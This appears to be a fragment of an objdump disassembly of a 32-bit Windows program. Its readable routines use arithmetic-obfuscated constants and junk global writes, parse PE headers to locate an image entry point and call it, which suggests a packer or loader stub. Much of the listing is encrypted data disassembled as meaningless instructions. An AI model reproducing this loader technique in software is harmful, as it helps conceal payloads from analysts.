  40f908:	dec    esi
  40f909:	test   eax,0xab9db59b
  40f90e:	es iret 
  40f910:	jno    0x40f950
  40f912:	inc    ebp
  40f913:	(bad)  
  40f914:	fwait
  40f915:	or     al,0x10
  40f917:	jp     0x40f92e
  40f919:	(bad)  
  40f91a:	mov    ah,ch
  40f91c:	lods   eax,DWORD PTR ds:[esi]
  40f91d:	int    0xbf
  40f91f:	shl    DWORD PTR [esi],cl
  40f921:	add    BYTE PTR [ebx+0x3904359e],cl
  40f927:	and    DWORD PTR ds:0x4337ab,0x433727
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x4336df
  40f947:	add    DWORD PTR ds:0x4336c7,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x4337af,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433797,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x433727
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x4337e3
  40f97f:	adc    ecx,DWORD PTR ds:0x43372b
  40f985:	mov    DWORD PTR ds:0x4337e3,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x433733,0x43372f
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x4337a3,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433717,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x43375b,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x4336c7,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x4337df
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x433763,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x4337b3,0x433727
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43379b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x43372f,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43379b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x433723,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x4336df,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x4336df,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x4336df
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	neg    DWORD PTR [eax]
  40fae2:	cmp    al,ah
  40fae4:	cmp    eax,0xae7c7cb3
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fb36
  40faed:	inc    edx
  40faee:	jmp    0x9c7c855a
  40faf3:	cmovns ecx,DWORD PTR [edi]
  40faf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faf7:	sub    dh,BYTE PTR [edi+ebp*4+0xb3eef40]
  40fafe:	(bad)  
  40fb00:	dec    esp
  40fb01:	dec    al
  40fb03:	pop    ds
  40fb04:	fcom   DWORD PTR [eax+0x70cd69e0]
  40fb0a:	shr    cl,cl
  40fb0c:	xchg   esp,eax
  40fb0d:	in     al,dx
  40fb0e:	cdq    
  40fb0f:	lds    edi,FWORD PTR [ebx-0x7742c138]
  40fb15:	and    eax,0x6bb69666
  40fb1a:	call   0x1266:0xd415f80f
  40fb21:	push   ecx
  40fb22:	into   
  40fb23:	fwait
  40fb24:	aad    0xec
  40fb26:	ds sub eax,0x348addcd
  40fb2c:	out    0x4f,al
  40fb2e:	inc    esp
  40fb2f:	jo     0x40fb7c
  40fb31:	or     al,BYTE PTR [eax-0x1d]
  40fb34:	fistp  WORD PTR [ecx]
  40fb36:	jnp    0x40fae6
  40fb38:	popa   
  40fb39:	mov    esi,0x443ce281
  40fb3e:	pop    edi
  40fb3f:	cs jecxz 0x40fb52
  40fb42:	push   esi
  40fb43:	scas   eax,DWORD PTR es:[edi]
  40fb44:	jo     0x40faf8
  40fb46:	xchg   esp,eax
  40fb47:	loope  0x40fb22
  40fb49:	mov    ebx,0x9b46797d
  40fb4e:	test   ah,ch
  40fb50:	neg    DWORD PTR [eax+0x62d2f43d]
  40fb56:	or     BYTE PTR [eax],al
  40fb58:	pusha  
  40fb59:	cmp    ecx,edx
  40fb5b:	shl    esp,0x4f
  40fb5e:	mov    DWORD PTR [edx],eax
  40fb60:	adc    al,0xa7
  40fb62:	sbb    eax,0xcaf3d3f3
  40fb67:	sbb    bl,BYTE PTR [esi-0x64f72903]
  40fb6d:	fwait
  40fb6e:	and    esp,DWORD PTR [ecx+0x31ccb477]
  40fb74:	add    DWORD PTR [eax-0x61],0xe9008018
  40fb7b:	in     al,dx
  40fb7c:	mov    ds:0xf1a86c83,al
  40fb81:	or     BYTE PTR [esi-0x17cb5144],dl
  40fb87:	and    DWORD PTR ds:[ebx],esi
  40fb8a:	out    0xa2,al
  40fb8c:	iret   
  40fb8d:	pop    ebp
  40fb8e:	(bad)  
  40fb8f:	jmp    0x40fb1f
  40fb91:	dec    ebp
  40fb92:	fst    DWORD PTR [edx]
  40fb94:	test   BYTE PTR [eax],dh
  40fb96:	loopne 0x40fbbd
  40fb98:	pop    DWORD PTR [ebp-0x61ad4779]
  40fb9e:	imul   eax,edi,0x4caa1219
  40fba4:	dec    esp
  40fba5:	cmp    al,0x43
  40fba7:	mov    al,0x0
  40fba9:	jo     0x40fb34
  40fbab:	loope  0x40fb79
  40fbad:	inc    eax
  40fbae:	cmc    
  40fbaf:	and    al,0xb4
  40fbb1:	sub    al,0x45
  40fbb3:	jl     0x40fc11
  40fbb5:	xchg   ebx,eax
  40fbb6:	fisubr DWORD PTR [ecx]
  40fbb8:	or     BYTE PTR [eax+0x7a30d43e],bh
  40fbbe:	pop    ds
  40fbbf:	ret    
  40fbc0:	or     BYTE PTR [eax],cl
  40fbc2:	sar    BYTE PTR ds:[eax+eiz*2-0x4e7c9df7],0x81
  40fbcb:	xor    DWORD PTR [eax],ecx
  40fbcd:	mov    fs,WORD PTR [esi-0x516dc898]
  40fbd3:	fistp  DWORD PTR [esi]
  40fbd5:	test   eax,0x3b6665d9
  40fbda:	inc    ecx
  40fbdb:	dec    esi
  40fbdc:	push   ecx
  40fbdd:	xchg   ebx,eax
  40fbde:	sbb    eax,0x4a93a08c
  40fbe3:	adc    edx,edi
  40fbe5:	push   0xd20e0ce3
  40fbea:	xchg   ebx,eax
  40fbeb:	adc    dl,ah
  40fbed:	jno    0x40fc44
  40fbef:	mov    ds,WORD PTR [ecx]
  40fbf1:	jns    0x40fc05
  40fbf3:	inc    eax
  40fbf4:	cmp    DWORD PTR [esp+ebx*1],esi
  40fbf7:	cld    
  40fbf8:	pop    DWORD PTR [edx+0x29]
  40fbfb:	add    eax,0x6a2d755
  40fc00:	in     eax,0x80
  40fc02:	jmp    0x24bbc833
  40fc07:	or     eax,0x47c6a3d
  40fc0c:	rol    DWORD PTR [ecx-0x6d228f61],0x80
  40fc13:	inc    eax
  40fc14:	pusha  
  40fc15:	pop    edi
  40fc16:	ins    DWORD PTR es:[edi],dx
  40fc17:	test   al,0xcc
  40fc19:	and    al,0xb4
  40fc1b:	inc    eax
  40fc1c:	pop    esi
  40fc1d:	pop    edi
  40fc1e:	inc    esp
  40fc1f:	(bad)  
  40fc20:	loope  0x40fbdf
  40fc22:	and    DWORD PTR [edx-0x73352238],esp
  40fc28:	sub    edx,DWORD PTR [ebp+0x360a5d81]
  40fc2e:	sbb    BYTE PTR [esi+ebx*8],al
  40fc31:	in     eax,dx
  40fc32:	xchg   esi,eax
  40fc33:	(bad)  
  40fc35:	add    DWORD PTR [ebx+0x78],0xfffffff9
  40fc39:	adc    esp,DWORD PTR [ebp+0x13274485]
  40fc3f:	in     al,dx
  40fc40:	mov    eax,ds:0xd48e3db4
  40fc45:	mov    esi,0xdd2b17f8
  40fc4a:	test   al,0xd5
  40fc4c:	pop    esi
  40fc4d:	xchg   esi,eax
  40fc4e:	hlt    
  40fc4f:	dec    esi
  40fc50:	ja     0x40fc55
  40fc52:	dec    ecx
  40fc53:	pop    ds
  40fc54:	hlt    
  40fc55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc56:	mov    bh,0x7f
  40fc58:	dec    ecx
  40fc59:	fmul   DWORD PTR es:[eax+0x389476a0]
  40fc60:	and    DWORD PTR [edx+0x7e131667],ebx
  40fc66:	cdq    
  40fc67:	xor    eax,0x217e32b9
  40fc6c:	sub    eax,0xa8b4c8d5
  40fc71:	mov    edx,0x4adcae9f
  40fc76:	pop    ss
  40fc77:	cld    
  40fc78:	lods   eax,DWORD PTR ds:[esi]
  40fc79:	frstor [eax]
  40fc7b:	jmp    FWORD PTR [ecx-0x5f]
  40fc7e:	lock std 
  40fc80:	lods   al,BYTE PTR ds:[esi]
  40fc81:	jnp    0x40fc08
  40fc83:	test   al,0x82
  40fc85:	(bad)  
  40fc86:	je     0x40fcbe
  40fc88:	out    0x6,al
  40fc8a:	adc    eax,0xcbe72f2a
  40fc8f:	pop    ebx
  40fc90:	js     0x40fcb1
  40fc92:	cmp    ecx,DWORD PTR [edi]
  40fc94:	pop    ecx
  40fc95:	adc    DWORD PTR [ebp+0x38],edi
  40fc98:	mov    ecx,esp
  40fc9a:	xor    bh,dh
  40fc9c:	mov    edi,0xd5474093
  40fca1:	nop    DWORD PTR [edi]
  40fca4:	dec    ecx
  40fca5:	mov    ds:0x94b3378c,al
  40fcaa:	push   edx
  40fcab:	or     BYTE PTR [esi],ah
  40fcad:	push   ebx
  40fcae:	sbb    BYTE PTR [esi],0xb7
  40fcb1:	inc    esp
  40fcb2:	ret    0x328d
  40fcb5:	stc    
  40fcb6:	ins    DWORD PTR es:[edi],dx
  40fcb7:	retf   
  40fcb8:	add    eax,0xbe42fac7
  40fcbd:	lods   eax,DWORD PTR ds:[esi]
  40fcbe:	sbb    al,ch
  40fcc0:	call   0x4ff130d7
  40fcc5:	mov    WORD PTR ds:0xbee3d299,cs
  40fccb:	clc    
  40fccc:	jmp    0x47de6787
  40fcd1:	pop    edi
  40fcd2:	fnstcw WORD PTR [ecx+0x4b]
  40fcd5:	std    
  40fcd6:	jae    0x40fca1
  40fcd8:	in     eax,dx
  40fcd9:	inc    ebp
  40fcda:	add    al,0x69
  40fcdc:	push   ecx
  40fcdd:	xchg   ecx,ecx
  40fcdf:	or     eax,0xedb649fc
  40fce4:	dec    edi
  40fce5:	push   esi
  40fce6:	adc    al,0x46
  40fce8:	jmp    0x1d93:0x52ac75e
  40fcef:	retf   0x7596
  40fcf2:	inc    esi
  40fcf3:	pop    edx
  40fcf4:	out    0x3c,al
  40fcf6:	inc    edx
  40fcf7:	test   DWORD PTR ds:0x9e127160,esp
  40fcfd:	add    BYTE PTR [eax],ah
  40fcff:	dec    eax
  40fd00:	outs   dx,DWORD PTR ds:[esi]
  40fd01:	pop    esp
  40fd02:	icebp  
  40fd03:	push   es
  40fd04:	neg    DWORD PTR [esi]
  40fd06:	pop    ecx
  40fd07:	les    ebp,FWORD PTR [edi+0x621b1f5f]
  40fd0d:	ins    DWORD PTR es:[edi],dx
  40fd0e:	jbe    0x40fd87
  40fd10:	jmp    FWORD PTR [edx]
  40fd12:	sub    BYTE PTR [ebx-0x61],bh
  40fd15:	inc    ecx
  40fd16:	loopne 0x40fd14
  40fd18:	mov    ds:0x4b44eb8d,eax
  40fd1d:	pusha  
  40fd1e:	inc    ecx
  40fd1f:	repz rol bh,cl
  40fd22:	add    al,0xff
  40fd24:	mov    WORD PTR [ecx+0x621bc513],?
  40fd2a:	ds mov edx,0xa41c3835
  40fd30:	add    edx,eax
  40fd32:	ja     0x40fceb
  40fd34:	cld    
  40fd35:	shl    DWORD PTR [eax+0x70],1
  40fd38:	pop    ebp
  40fd39:	(bad)  
  40fd3a:	aad    0xb7
  40fd3c:	outs   dx,BYTE PTR ds:[esi]
  40fd3d:	xor    al,0xad
  40fd3f:	nop
  40fd40:	ficom  DWORD PTR [ecx]
  40fd42:	popf   
  40fd43:	or     eax,0x820c9c28
  40fd48:	in     al,dx
  40fd49:	cs jo  0x40fd7f
  40fd4c:	outs   dx,BYTE PTR ds:[esi]
  40fd4d:	inc    ebx
  40fd4e:	xchg   ecx,eax
  40fd4f:	cmp    eax,0xbd239b40
  40fd54:	xor    eax,0x6768122f
  40fd59:	call   0xa915:0xdeb55334
  40fd60:	adc    eax,0x60
  40fd63:	pop    ecx
  40fd64:	push   ss
  40fd65:	inc    ecx
  40fd66:	std    
  40fd67:	sub    eax,0x278b760b
  40fd6c:	mov    edi,0x8eaed02e
  40fd71:	add    edx,edx
  40fd73:	and    al,0x9a
  40fd75:	pop    ebp
  40fd76:	pop    ss
  40fd77:	cmp    al,0x5
  40fd79:	and    ch,BYTE PTR [ebp-0x56cbcaf5]
  40fd7f:	aam    0x3c
  40fd81:	xchg   ebp,eax
  40fd82:	iret   
  40fd83:	fs jbe 0x40fda0
  40fd86:	xlat   BYTE PTR ds:[ebx]
  40fd87:	mov    ah,0xf2
  40fd89:	jno    0x40fd1d
  40fd8b:	retf   0x22
  40fd8e:	ins    BYTE PTR es:[edi],dx
  40fd8f:	div    BYTE PTR [edx+ecx*1-0x48b37b21]
  40fd96:	pop    esi
  40fd97:	sub    edx,DWORD PTR [ecx]
  40fd99:	jo     0x40fdbb
  40fd9b:	or     al,BYTE PTR [ebp+0x11088bc3]
  40fda1:	adc    eax,0x4336df
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	ret    0x4b7d
  40fdc9:	inc    ebx
  40fdca:	outs   dx,DWORD PTR ds:[esi]
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	loopne 0x40fd58
  40fdd4:	cmp    ebp,DWORD PTR [esi-0xa8fb3d7]
  40fdda:	mov    bl,0x6f
  40fddc:	xchg   DWORD PTR [ebp-0x57f4ac6c],edx
  40fde2:	test   eax,0x6b920a42
  40fde7:	xor    ebp,DWORD PTR [ecx-0x4d]
  40fdea:	dec    ebp
  40fdeb:	jae    0x40fd7a
  40fded:	xchg   ebx,eax
  40fdee:	jmp    0xcd17:0x8db9b4b2
  40fdf5:	in     eax,0x27
  40fdf7:	sti    
  40fdf8:	mov    edi,0x6554aa6
  40fdfd:	inc    esi
  40fdfe:	ss mov ebx,0xf3536bba
  40fe04:	or     eax,0x5cf8cea1
  40fe09:	pop    esi
  40fe0a:	or     esi,ecx
  40fe0c:	stos   BYTE PTR es:[edi],al
  40fe0d:	or     eax,0xf5b46717
  40fe12:	or     eax,0xf5f16bd8
  40fe17:	(bad)  
  40fe18:	jne    0x40fdad
  40fe1a:	sub    al,0xce
  40fe1c:	inc    esi
  40fe1d:	fimul  DWORD PTR [edx-0x71]
  40fe20:	xor    al,0xfd
  40fe22:	imul   esi,esi,0xff2100e9
  40fe28:	add    eax,esp
  40fe2a:	pop    edi
  40fe2b:	sbb    BYTE PTR [edi+0x1e],al
  40fe2e:	dec    ebp
  40fe2f:	aaa    
  40fe30:	into   
  40fe31:	add    esi,DWORD PTR [edi]
  40fe33:	lods   al,BYTE PTR cs:[esi]
  40fe35:	push   esp
  40fe36:	test   al,0x79
  40fe38:	mov    bl,0xe6
  40fe3a:	sub    al,0x5
  40fe3c:	inc    esp
  40fe3d:	mov    esp,0xdb3b135b
  40fe42:	jl     0x40fe20
  40fe44:	and    ah,BYTE PTR ds:0xd89d38a
  40fe4a:	sbb    DWORD PTR [ecx+0x6e],edi
  40fe4d:	imul   edx,ecx,0x57
  40fe50:	and    eax,0x1eed7b11
  40fe56:	(bad)  
  40fe57:	adc    ch,dl
  40fe59:	loopne 0x40fe40
  40fe5b:	mov    dl,0x3a
  40fe5d:	push   eax
  40fe5e:	test   eax,0xa2c99c13
  40fe63:	xor    eax,DWORD PTR [ebx]
  40fe65:	xchg   edx,eax
  40fe66:	pop    ebx
  40fe67:	cdq    
  40fe68:	jge    0x40fe6f
  40fe6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe6b:	call   0x4778a3a8
  40fe70:	dec    edi
  40fe71:	jl     0x40fef0
  40fe73:	(bad)  
  40fe74:	jp     0x40fec4
  40fe76:	bound  esp,QWORD PTR [eax]
  40fe78:	push   edx
  40fe79:	push   edx
  40fe7a:	int    0x5d
  40fe7c:	shr    DWORD PTR [edx],1
  40fe7e:	mov    esi,0xc20b52c2
  40fe83:	jle    0x40fe2e
  40fe85:	ins    BYTE PTR es:[edi],dx
  40fe86:	imul   ebp,DWORD PTR [edx+0x47a70f97],0x3f8865d8
  40fe90:	pop    esi
  40fe91:	mov    ecx,?
  40fe93:	cmp    DWORD PTR [edx],eax
  40fe95:	sub    esi,ebx
  40fe97:	stos   DWORD PTR es:[edi],eax
  40fe98:	test   eax,0xde1bcc9
  40fe9d:	or     ah,BYTE PTR [edx]
  40fe9f:	add    BYTE PTR [ebx],dl
  40fea1:	cmp    esi,DWORD PTR [ebp+0x71d8e6e5]
  40fea7:	and    al,0x2
  40fea9:	mov    BYTE PTR [esi+0x33],dl
  40feac:	ins    DWORD PTR es:[edi],dx
  40fead:	xacquire xchg BYTE PTR [edx+0x51],dh
  40feb1:	nop
  40feb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb3:	pop    ss
  40feb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb5:	shl    DWORD PTR [edx-0x72],0x2b
  40feb9:	test   esi,ebp
  40febb:	(bad)  
  40febc:	in     al,dx
  40febd:	or     edx,DWORD PTR [ecx-0x16]
  40fec0:	cmp    cl,BYTE PTR [eax]
  40fec2:	repz jmp 0x40ff31
  40fec5:	push   0x4ea2059c
  40feca:	inc    edx
  40fecb:	stc    
  40fecc:	clc    
  40fecd:	test   ebx,0x3d51c006
  40fed3:	out    dx,al
  40fed4:	push   esp
  40fed5:	fs enter 0x12c3,0x22
  40feda:	cdq    
  40fedb:	ror    DWORD PTR gs:[eax-0x40],1
  40fedf:	int3   
  40fee0:	xchg   esp,eax
  40fee1:	addr16 mov bl,0xea
  40fee4:	ins    DWORD PTR es:[edi],dx
  40fee5:	mov    ch,0xc3
  40fee7:	(bad)  [ecx+0x16]
  40feea:	cmp    al,0x87
  40feec:	in     eax,dx
  40feed:	sub    edi,DWORD PTR [ecx]
  40feef:	jge    0x40fe8d
  40fef1:	(bad)  
  40fef2:	xchg   eax,ebx
  40fef4:	jb     0x40fea5
  40fef6:	pop    esi
  40fef7:	xchg   ebx,eax
  40fef8:	sub    al,0x1
  40fefa:	enter  0xbca5,0x9e
  40fefe:	out    0xd0,al
  40ff00:	xchg   ebx,esi
  40ff02:	test   eax,0x1fecdbc3
  40ff07:	outs   dx,DWORD PTR ds:[esi]
  40ff08:	inc    BYTE PTR ds:0xa7232655
  40ff0e:	or     DWORD PTR [edx+0x76],esi
  40ff11:	pop    edx
  40ff12:	xlat   BYTE PTR ds:[ebx]
  40ff13:	fistp  WORD PTR [esi+0x4]
  40ff16:	push   ebp
  40ff17:	pop    es
  40ff18:	push   esi
  40ff19:	inc    edx
  40ff1a:	fnstenv ss:[esi+esi*8]
  40ff1e:	test   DWORD PTR [ecx-0x4096f1b1],esp
  40ff24:	fdiv   st(7),st
  40ff26:	jp     0x40ff90
  40ff28:	xchg   eax,esp
  40ff2a:	sbb    edi,DWORD PTR [esi+0x3a]
  40ff2d:	cwde   
  40ff2e:	push   edx
  40ff2f:	jno    0x40fef7
  40ff31:	cmp    BYTE PTR [eax+0x1f5cdc6c],ah
  40ff37:	or     eax,0xfe98d6b3
  40ff3c:	call   0xeffe:0x7fc64ee6
  40ff43:	test   al,0x5d
  40ff45:	inc    ecx
  40ff46:	jo     0x40ff26
  40ff48:	mov    esi,0x214978dd
  40ff4d:	mov    bh,0xec
  40ff4f:	mov    bl,0x91
  40ff51:	jle    0x40ff39
  40ff53:	add    al,0x53
  40ff55:	or     edx,DWORD PTR [esp+ebx*1]
  40ff58:	adc    eax,0xd0a18a04
  40ff5d:	xlat   BYTE PTR ds:[ebx]
  40ff5e:	outs   dx,BYTE PTR ds:[esi]
  40ff5f:	lahf   
  40ff60:	mov    gs,WORD PTR [edi+0x57ccac5a]
  40ff66:	sub    dh,BYTE PTR [eax+0x1c]
  40ff69:	sbb    al,0xb7
  40ff6b:	inc    ebx
  40ff6c:	vunpcklps ymm3,ymm3,YMMWORD PTR ds:0x899dfc6b
  40ff74:	test   eax,0xa00c27af
  40ff79:	or     bh,BYTE PTR [edx-0x33dd4870]
  40ff7f:	out    dx,eax
  40ff80:	xor    al,0xb
  40ff82:	jb     0x40ffba
  40ff84:	mov    ebx,0xb679bdc5
  40ff89:	es or  eax,0x85530c8c
  40ff8f:	in     al,0xef
  40ff91:	sti    
  40ff92:	mov    eax,ds:0x40f220ea
  40ff97:	jmp    0xf12c:0x6460bd06
  40ff9e:	or     DWORD PTR [ecx-0x47],edx
  40ffa1:	ins    DWORD PTR es:[edi],dx
  40ffa2:	mov    bl,bl
  40ffa4:	jmp    0x40ffc3
  40ffa6:	add    BYTE PTR [eax+0x5dce6ade],cl
  40ffac:	outs   dx,BYTE PTR ds:[esi]
  40ffad:	stc    
  40ffae:	stos   DWORD PTR es:[edi],eax
  40ffaf:	push   ss
  40ffb0:	fnstcw WORD PTR [esi+0x5c]
  40ffb3:	sbb    eax,ecx
  40ffb5:	sub    dx,cx
  40ffb8:	inc    ecx
  40ffb9:	pop    ebp
  40ffba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffbb:	sub    edi,DWORD PTR [esi+ecx*8]
  40ffbe:	cld    
  40ffbf:	test   DWORD PTR [ecx-0x6370d019],0x60c3b052
  40ffc9:	fbld   TBYTE PTR [edi-0xd]
  40ffcc:	sbb    DWORD PTR [edi+0xf],ecx
  40ffcf:	mov    ah,0x98
  40ffd1:	ret    0x13a6
  40ffd4:	cld    
  40ffd5:	push   0xac0c550a
  40ffda:	fs push esi
  40ffdc:	scas   al,BYTE PTR es:[edi]
  40ffdd:	dec    edi
  40ffde:	adc    eax,0x81f72278
  40ffe3:	retf   
  40ffe4:	stos   DWORD PTR es:[edi],eax
  40ffe5:	push   ebx
  40ffe6:	pop    edx
  40ffe7:	ficom  WORD PTR [ebp+0x23]
  40ffea:	inc    edi
  40ffeb:	mov    bh,ah
  40ffed:	xor    ah,BYTE PTR [eax+0xd]
  40fff0:	add    eax,0x3fda7717
  40fff5:	fisttp QWORD PTR [edi-0x4e6e23e8]
  40fffb:	test   DWORD PTR ds:0xa5e148ff,0x34d4f1e9
  410005:	mov    gs,WORD PTR [edx]
  410007:	test   al,0xad
  410009:	aam    0x6e
  41000b:	dec    eax
  41000c:	push   es
  41000d:	scas   eax,DWORD PTR es:[edi]
  41000e:	mov    ebx,0xa8957b0f
  410013:	sub    al,0xb7
  410015:	sti    
  410016:	gs sbb ecx,ebp
  410019:	xchg   ecx,eax
  41001a:	fs jl  0x410015
  41001d:	sbb    eax,0xcf557c7d
  410022:	fdivrp st(7),st
  410024:	sbb    BYTE PTR [edx+0x76],bh
  410027:	clc    
  410028:	cmp    DWORD PTR [edi+0x6f8755b7],eax
  41002e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002f:	aam    0x57
  410031:	pop    ds
  410032:	jmp    0x40ffed
  410034:	add    al,0xb3
  410036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410037:	nop
  410038:	xor    BYTE PTR [eax+0x5c1b9a5e],bl
  41003e:	xor    eax,0x24cc1df
  410043:	clc    
  410044:	push   ecx
  410045:	jo     0x410032
  410047:	push   edx
  410048:	add    bl,BYTE PTR [edx-0x108860a0]
  41004e:	pop    eax
  41004f:	jae    0x4100a5
  410051:	outs   dx,BYTE PTR ds:[esi]
  410052:	outs   dx,DWORD PTR ds:[esi]
  410053:	std    
  410054:	sub    DWORD PTR [esi-0x7f],edi
  410057:	add    eax,0x8cc133ec
  41005c:	push   0x52
  41005e:	pop    eax
  41005f:	jle    0x41002c
  410061:	fcom   st(4)
  410063:	mov    edx,?
  410065:	es test al,0x74
  410068:	out    dx,eax
  410069:	pop    ebp
  41006a:	lods   al,BYTE PTR ds:[esi]
  41006b:	mov    esi,DWORD PTR [esi+0x4]
  41006e:	stc    
  41006f:	cs push 0xffffff96
  410072:	daa    
  410073:	inc    eax
  410074:	mov    dh,0x80
  410076:	xchg   ebp,eax
  410077:	repz adc al,bl
  41007a:	jnp    0x4100b9
  41007c:	aas    
  41007d:	xchg   DWORD PTR [esi-0x61],edi
  410080:	sub    eax,DWORD PTR [eax]
  410082:	leave  
  410083:	aad    0x8b
  410085:	inc    ebp
  410086:	adc    BYTE PTR [esi-0x7b],bl
  410089:	ror    BYTE PTR [edi],0x84
  41008c:	push   ds
  41008d:	add    BYTE PTR [eax],al
  41008f:	add    bh,bh
  410091:	xor    eax,0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x43375f,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x43375f
  4100d6:	inc    eax
  4100d7:	mov    ds:0x43375f,eax
  4100dc:	cmp    DWORD PTR ds:0x43375f,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x43375f,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x43375f,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x43375f
  410111:	inc    eax
  410112:	mov    ds:0x43375f,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x4337f3
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x4336d7,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x43375f,0x433763
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x4336cf,0x4336c7
